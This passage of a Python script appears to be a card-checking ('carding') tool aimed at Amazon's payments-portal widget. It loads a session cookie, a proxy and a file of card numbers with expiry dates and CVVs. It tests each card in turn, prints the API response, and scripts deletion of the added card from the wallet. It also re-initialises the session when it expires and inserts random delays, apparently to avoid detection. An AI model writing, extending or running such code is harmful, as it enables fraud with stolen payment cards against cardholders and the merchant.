                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'widget-ajax-attempt-count': '0',
                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'}
        burl = f'https://www.{d}/payments-portal/data/widgets2/v1/customer/{cust}/continueWidget'

        try:
            #//! Step 1 — StartEditEvent
            r1 = self.s.post(burl, headers=whdr, timeout=self.TIMEOUT, data={
                'ppw-jsEnabled': 'true', 'ppw-widgetState': wst, 'ppw-widgetEvent': 'StartEditEvent',
                'ppw-iid': ppw_iid, 'ppw-paymentMethodType': 'Card',
                'ppw-isDefaultPaymentMethod': is_def}).text
            wst2 = (self.cap(r1, 'ppw-widgetState\\" value=\\"', '\\"')
                    or self.cap(r1, 'ppw-widgetState" value="', '"')
                    or self.cap(r1, 'ppw-widgetState\\\\" value=\\\\"', '\\\\"'))
            if not wst2:
                return False

            if not iid_short:
                m = re.search(r'0h_PU_CUS_[a-f0-9\-]+', r1)
                if m:
                    iid_short = m.group()
            if not iid_short:
                return False

            e_name  = self.cap(r1, 'ppw-accountHolderName\\" value=\\"', '\\"') or self.cap(r1, 'ppw-accountHolderName" value="', '"') or 'Card Holder'
            e_month = '12'
            mm = re.search(r'expirationDate_month.*?selected.*?value=.{0,3}(\d{1,2})', r1)
            if mm:
                e_month = mm.group(1)
            e_year = '2029'
            my = re.search(r'expirationDate_year.*?selected.*?value=.{0,3}(\d{4})', r1)
            if my:
                e_year = my.group(1)

            #//! Step 2 — StartDeleteEvent
            ev = json.dumps({"iid": iid_short, "paymentMethodCode": "CC"}, separators=(',', ':'))
            r2 = self.s.post(burl + '?sif_profile=APX-Encrypt-All-NA', headers=whdr, timeout=self.TIMEOUT, data={
                f'ppw-widgetEvent:StartDeleteEvent:{ev}': 'Eliminar de wallet',
                'ppw-jsEnabled': 'true', 'ppw-widgetState': wst2, 'ie': 'UTF-8',
                'ppw-accountHolderName': e_name,
                'ppw-expirationDate_month': e_month, 'ppw-expirationDate_year': e_year}).text
            wst3 = (self.cap(r2, 'ppw-widgetState\\" value=\\"', '\\"')
                    or self.cap(r2, 'ppw-widgetState" value="', '"')
                    or self.cap(r2, 'ppw-widgetState\\\\" value=\\\\"', '\\\\"'))
            if not wst3:
                return False

            #//! Step 3 — DeleteInstrumentEvent
            r3 = self.s.post(burl, headers=whdr, timeout=self.TIMEOUT, data={
                'ppw-jsEnabled': 'true', 'ppw-widgetState': wst3, 'ie': 'UTF-8',
                'ppw-widgetEvent': 'DeleteInstrumentEvent'})
            return getattr(r3, 'status_code', 0) == 200
        except Exception:
            return False


def _load_file(path, default=None):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except FileNotFoundError:
        return default
    except Exception:
        return default


#//! --------------------------------- CLI  --------------------------------- !\\#
if __name__ == '__main__':
    HERE = os.path.dirname(os.path.abspath(__file__))

    COOKIE = _load_file(os.path.join(HERE, 'cookie.txt'), '')
    if not COOKIE:
        print('cookie.txt not found or empty')
        sys.exit(1)

    cc_file = os.path.join(HERE, 'cards.txt')
    if not os.path.exists(cc_file):
        with open(cc_file, 'w', encoding='utf-8') as f:
            f.write('# num|mm|yy|cvv\n')
        print('cards.txt created, add cards and retry')
        sys.exit(0)
    CARDS = []
    with open(cc_file, 'r', encoding='utf-8') as f:
        for ln in f:
            ln = ln.strip()
            if ln and not ln.startswith('#') and '|' in ln:
                CARDS.append(ln)
    if not CARDS:
        print('No valid cards in cards.txt')
        sys.exit(1)

    PROXY = _load_file(os.path.join(HERE, 'proxy.txt'), None)
    if PROXY and PROXY.startswith('#'):
        PROXY = None

    #//!Sesion reutilizada: init una sola vez (R1+R2+address), no por tarjeta.
    g = AmazonGate(COOKIE, PROXY)
    ri = g.init()
    if not ri['ok']:
        for card in CARDS:
            print(json.dumps({'CC': card, 'ApiResp': ri['msg'], 'T/Tkn': '0s'}, ensure_ascii=False))
        g.close()
        sys.exit(0)

    try:
        for i, card in enumerate(CARDS, 1):
            t1 = time.time()
            try:
                res = g.process(card)
                api_resp = res.get('apiResponse') or res.get('response') or res.get('message', '?')
                # Si la sesion murio a mitad del lote, re-init una vez y reintenta
                if not res.get('success') and 'expired' in str(api_resp).lower() and 'failed' in str(api_resp).lower():
                    ri2 = g.init()
                    if ri2['ok']:
                        t1 = time.time()
                        res = g.process(card)
                        api_resp = res.get('apiResponse') or res.get('response') or res.get('message', '?')
            except Exception as e:
                api_resp = f'Connection failed ({type(e).__name__})'
            dt = round(time.time() - t1, 2)
            print(json.dumps({'CC': card, 'ApiResp': api_resp, 'T/Tkn': f'{dt}s'}, ensure_ascii=False))
            sys.stdout.flush()
            if i < len(CARDS):
                time.sleep(random.uniform(1, 3))
    finally:
        g.close()
